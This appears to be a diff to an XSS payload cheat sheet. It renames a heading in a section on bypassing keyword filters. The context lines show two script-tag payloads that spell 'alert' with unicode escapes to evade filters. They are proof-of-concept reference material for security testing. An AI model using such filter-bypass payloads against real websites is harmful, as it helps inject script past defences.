@@ -260,7 +260,7 @@ https://portswigger.net/research/finding-dom-polyglot-xss-in-paypal-the-easy-way
 ```  
 
 ### Keyword Based in Filter
-#### Alert Blocked - Bypass
+#### "alert" blocked - Bypass
 ```
 <script>\u0061lert(1)</script>
 <script>\u0061\u006C\u0065\u0072\u0074(1)</script>
